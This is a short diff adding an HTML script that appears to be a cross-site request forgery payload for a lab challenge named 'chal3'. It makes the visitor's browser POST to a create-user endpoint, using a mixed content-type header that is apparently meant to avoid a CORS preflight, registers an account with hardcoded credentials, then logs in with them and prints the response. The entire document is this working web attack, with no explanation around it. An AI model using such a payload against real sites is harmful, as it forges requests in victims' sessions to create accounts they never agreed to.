@@ -1,0 +1,17 @@
+<script>
+  (async () => {
+    await fetch("http://app.example.com/chal3/create-user", {
+      method: "POST",
+      headers: {
+        "Content-Type": "text/plain; application/json",
+      },
+      body: JSON.stringify({ username: "jlkqb7b", password: "ty3gqnk" }),
+    }).catch(() => {});
+
+    const r = await fetch("http://app.example.com/chal3/login", {
+      method: "POST",
+      body: new URLSearchParams({ username: "jlkqb7b", password: "ty3gqnk" }),
+    });
+    console.log(await r.text());
+  })();
+</script>
